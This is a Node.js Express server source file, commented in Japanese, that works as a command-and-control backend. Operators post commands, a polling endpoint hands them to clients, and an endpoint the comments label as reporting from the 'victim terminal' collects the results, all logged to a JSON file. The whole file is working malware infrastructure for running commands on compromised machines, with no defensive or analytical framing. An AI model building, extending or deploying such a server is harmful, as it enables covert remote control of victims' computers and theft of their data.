const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(bodyParser.json());

const PORT = process.env.PORT || 3000;
const LOG_FILE = path.join(__dirname, "db", "commands.json");

// メモリ上の待機中コマンド情報（id → {command, resolve, timeout, timestamp}）
const pendingCommands = new Map();

// ログ（起動時に読み込む）
let logs = [];
if (fs.existsSync(LOG_FILE)) {
  try {
    logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf-8"));
  } catch (e) {
    console.error("ログファイル読み込みエラー:", e);
  }
}

// ログ保存関数
function saveLogs() {
  try {
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
  } catch (e) {
    console.error("ログ保存エラー:", e);
  }
}

// ID生成（簡易）
function generateId() {
  return Date.now().toString();
}

// API: コマンド送信 → 結果を最大15秒待つ同期処理
app.post("/api/send", (req, res) => {
  const { cmd } = req.body;
  if (!cmd || typeof cmd !== "string") {
    return res.status(400).json({ error: "cmd（文字列）が必要です" });
  }

  const id = generateId();
  const timestamp = Date.now();

  // ログに登録（結果は後でセット）
  logs.push({
    id,
    command: cmd,
    timestamp,
    status: "pending",
    result: null,
  });
  saveLogs();

  // Promiseで結果を待つ
  const resultPromise = new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      // タイムアウト処理
      pendingCommands.delete(id);
      // ログ更新
      const logEntry = logs.find((e) => e.id === id);
      if (logEntry) {
        logEntry.status = "timeout";
        logEntry.result = "Timeout: no response from client";
        saveLogs();
      }
      reject(new Error("Timeout: no response from client"));
    }, 15000);

    pendingCommands.set(id, { command: cmd, resolve, timeout, timestamp });
  });

  // クライアントは /api/poll で取得する仕組み

  res.setTimeout(16000); // 16秒でHTTPリクエストタイムアウト設定

  resultPromise
    .then((result) => {
      // ログ更新
      const logEntry = logs.find((e) => e.id === id);
      if (logEntry) {
        logEntry.status = "executed";
        logEntry.result = result;
        saveLogs();
      }
      res.json({ id, result });
    })
    .catch((err) => {
      res.status(504).json({ error: err.message });
    });
});

app.post("/api/poll", (req, res) => {
  for (const [id, data] of pendingCommands.entries()) {
    // pendingCommands.delete(id); ← 削除しない
    return res.json({ id, command: data.command });
  }
  res.status(204).send();
});


// API: 被害端末の実行結果報告
app.post("/api/report", (req, res) => {
  const { id, result } = req.body;
  if (!id || typeof result !== "string") {
    return res.status(400).json({ error: "idとresult（文字列）が必要です" });
  }

  const data = pendingCommands.get(id);
  if (!data) {
    // 既にタイムアウトか存在しないid
    return res.status(404).json({ error: "Command ID not found or timed out" });
  }

  clearTimeout(data.timeout);
  data.resolve(result);
  pendingCommands.delete(id);

  res.json({ message: "Result received" });
});

// API: ログ取得（コマンド履歴と結果）
app.get("/api/logs", (req, res) => {
  res.json(logs);
});

// サーバ起動
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
